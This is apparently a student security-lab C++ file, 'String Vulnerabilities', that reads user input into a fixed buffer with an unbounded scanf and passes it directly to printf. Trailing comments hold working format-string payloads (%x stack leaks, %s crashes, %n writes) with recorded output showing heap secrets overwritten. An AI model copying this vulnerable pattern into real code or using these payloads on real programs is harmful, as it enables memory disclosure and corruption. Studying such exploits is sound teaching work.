//
//  main.cpp
//  String Vulnerabilities
//  ceng test
//

#include <iostream>
#include <stdio.h>
#include <stdlib.h>


#define SECRET1 0x44
#define SECRET2 0x55

int main(int argc, char *argv[])
{
    char user_input[100];
    int *secret;
    int int_input;
    int a, b, c, d; /* other variables, not used here.*/
    
    /**
    int *tat = (int *) malloc(1*sizeof(int));
    *tat = 5;
     **/
    //a = (int *) malloc(20000*sizeof(int));
    a = (int *) malloc(100*sizeof(int));

    secret = (int *) malloc(2*sizeof(int));
    
    /* getting the secret */
    secret[0] = SECRET1; secret[1] = SECRET2;
    


//while (1) {
   // printf("The variable tat address is 0x%8x|%d (on stack)\n", &tat), &tat;

    printf("The variable secret's address is 0x%8x|%d (on stack)\n", &secret), &secret;
    printf("The variable secret's value is 0x%8x|%d (on heap)\n", secret, secret);
    printf("secret[0]'s address is 0x%8x|%d  (on heap)\n", &secret[0], &secret[0]);
    printf("secret[1]'s address is 0x%8x|%d  (on heap)\n", &secret[1], &secret[1]);
    printf("The user_input address is 0x%8x|%d  (on stack) \n", &user_input, &user_input);
    printf("The int_input address is 0x%8x|%d (on stack)\n", &int_input, &int_input);

    /***
    printf("The variable secret's address is 0x%8x|%d (on stack)\n", &secret), &secret;
    printf("The variable secret's value is 0x%8x|%d (on heap)\n", secret, secret);
    printf("secret[0]'s address is 0x%8x|%d  (on heap)\n", &secret[0], &secret[0]);
    printf("secret[1]'s address is 0x%8x|%d  (on heap)\n", &secret[1], &secret[1]);
    printf("CCCCC user_input address is 0x%8x|%d  (on stack) \n", &user_input, &user_input);
    printf("CCCCC int_input address is 0x%8x|%d (on stack)\n", &int_input, &int_input);
    printf("intsize=%d, ptrs=%d, chars=%d \n", sizeof(int), sizeof(int*), sizeof(char));
    **/
    
/**
    printf("Please enter a decimal integer\n");
    scanf("%d", &int_input);  
**/
    printf("Please enter a string\n");
    scanf("%s", user_input); /* getting a string from user */
    
    /* Vulnerable place */
    printf(user_input);
    printf("\n");
    
    /* Verify whether your attack is successful */
    printf("The original secrets: 0x%x -- 0x%x\n", SECRET1, SECRET2);
    printf("The new secrets:      0x%x -- 0x%x\n", secret[0], secret[1]);


/**
printf("Ctest=%x, %s", 134524936, 134524936);
**/

//}
    return 0;
    

    
    
    //\x48\xf6\xbf\x5f_0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x
//\x5f\xbf\xf6\x48_0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x
    
    
    //\x68\xf6\xbf\x5f_0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|0x%08x
    //\x5f\xbf\xf6\x68_0x%08x|0x%08x|0x%08x|0x%08x|0x%08x|%s
    //\xe4\x00\x10\x00 %x-%x-%x-%x-%s
    //\x00\x10\x00\xe4 %x-%x-%x-%x-%s
    //0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|%n  (secret 2)
    //0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|%n  (secret 1)
    
    //crashes the program - A
    //%s%s%s%s
    // and %s|12345%n|67890%n
    
    //print everything B - ALL
 // \x8\x04\xb0\x08 %x %x %x %x %x %x %x %x %x %x


//-1073745784 %x %x %x %x %x %x %x %x %x %s


    //0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x
    
    
    //print secret's value -- B
    //0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x
    //0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x
    //%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|0x%8x
    //%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|0x%8x|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d



    //metest2 - Ubun 0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%2008x|%n|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|%n
//|0x%8x|%n|0x%8x|%n|0x%8x|%n|0x%8x|%n
    
    //changes both 1 and 2 -- C
    //0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|%n|0x%8x|0x%8x|0x%8x|0x%8x|%n
    //0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|%n|0x%8x|0x%8x|0x%8x|0x%8x|%n
    //-- extra, 0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|400%8x|%n|0x%8x|0x%8x|0x%8x|0x%8x|%n
    /** The original secrets: 0x44 -- 0x55
     The new secrets:      0xbb -- 0x8e
     **/
    
    /** the 2nd one:
     Please enter a string
     x       0|0x73f73890|0xf5097a42|0x73f6f788|0x       0|0x       0|0x       0|0x       0|0x       0|0x      16|0x      1f|0x      3b|400      35||0x5fbff728|0x      39|0x       1|0x5fbff6e0|
     The original secrets: 0x44 -- 0x55
     The new secrets:      0xbc -- 0x8f
     ***/
    
    
    //specifically modify to x1234 - D
    //0x%4503x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|%n|0x%8x|0x%8x|0x%8x|0x%8x|%n
    //0x%4481x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|%n|0x%8x|0x%8x|0x%8x|0x%8x|%n
    // D- modify both to x1234
    //0x%4660d|0x%d|0x%d|0x%d|0x%d|0x%d|0x%d|0x%d|0x%d|0x%d|0x%d|0x%d|0x%d|%d|0x%d|0x%d|0x%d|0x%d|%n
    //%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%n|0x%d|0x%d|0x%d|%n
    

    //1234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890%d%n
    //0x%4481x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|%n|0x%8x|0x%8x|0x%8x|12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345670%d%n

    //The new secrets:      0x1234 -- 0x1207

    
    //0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x|0x%8x
    
    
    
    /****1234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890**/
    /****
     12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678909999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999
     
     
     12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678
     
1234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789\087555555555087555555555087555555555087555555555087555555555087555555555087555555555087555555555087555555555
     
     1234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456|%d1232222|%n <<== this one is bad too
     
     1234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456%d12%d%n <<== this one is bad too

     
     1234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012%d%d%n
     12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789
     
     **/

}
